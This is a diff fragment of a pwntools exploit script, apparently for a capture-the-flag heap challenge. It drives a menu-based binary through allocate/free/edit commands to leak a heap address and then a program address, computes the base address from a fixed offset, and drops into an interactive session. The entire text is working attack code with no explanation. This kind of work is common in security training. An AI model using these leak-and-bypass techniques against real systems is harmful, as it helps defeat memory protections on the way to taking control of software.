@@ -15,6 +15,17 @@ r.sendline('2 0')
 r.recvuntil('choice: \n')
 heap_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
 heap = heap_leak - 0x13cf0
-print(hex(heap))
+
+
+r.sendlineafter('choice: \n', '0 0 0')
+r.sendlineafter('choice: \n', '1 0 24')
+r.sendline(' '.join(['65' for i in range(24)]))
+r.sendlineafter('choice: \n', '4 3')
+r.sendlineafter('choice: \n', '4 0')
+r.sendlineafter('choice: \n', '0 1 0')
+r.sendline('2 0')
+r.recvuntil('choice: \n')
+program_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
+program = program_leak - 0x202ce8
 
 r.interactive()
